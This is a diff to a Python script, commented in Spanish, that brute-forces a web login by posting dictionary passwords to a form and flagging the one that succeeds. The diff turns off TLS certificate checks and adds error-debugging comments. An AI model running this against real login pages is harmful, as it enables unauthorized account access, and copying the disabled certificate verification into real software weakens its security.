@@ -1,5 +1,7 @@
 import requests
 import time
+import urllib3
+requests.packages.urllib3.disable_warnings()
 
 print("""\
 -----------------------------------------------------------------------
@@ -25,10 +27,9 @@ def funcion():
 		for contraseña in dictionary:
 			datos = { 'Login': 'submit', 'username' : usuario, 'password' : contraseña.strip("\n") }        ##IMPORTANTE: MODIFICAR CAMPOS SEGUN NECESIDAD
 			
-			respuesta = requests.post(url, data=datos)
-			respuesta2 = respuesta.text
+			respuesta = requests.post(url, data=datos, verify=False)
 			
-			if bad_login not in respuesta2:
+			if bad_login not in respuesta.text:
 				print("""
 				|---------------------------------------------------------------------|
 				|                       CREDENCIALES ENCONTRADAS!                     |
@@ -52,9 +53,11 @@ def funcion():
 		funcion()
 		
 	except:
+	#except Exception as e:						# ---> Permite ver el error en el codigo
 		print("Se produjo un error. Consejo: verifique la pagina ingresada y vuelva a intentarlo. ")
 		time.sleep(2)
 		print("Cerrando el programa...")
 		time.sleep(2)
-
+		#print(f"Error: {e}")					# ---> Muestra el error del codigo
+		
 funcion()
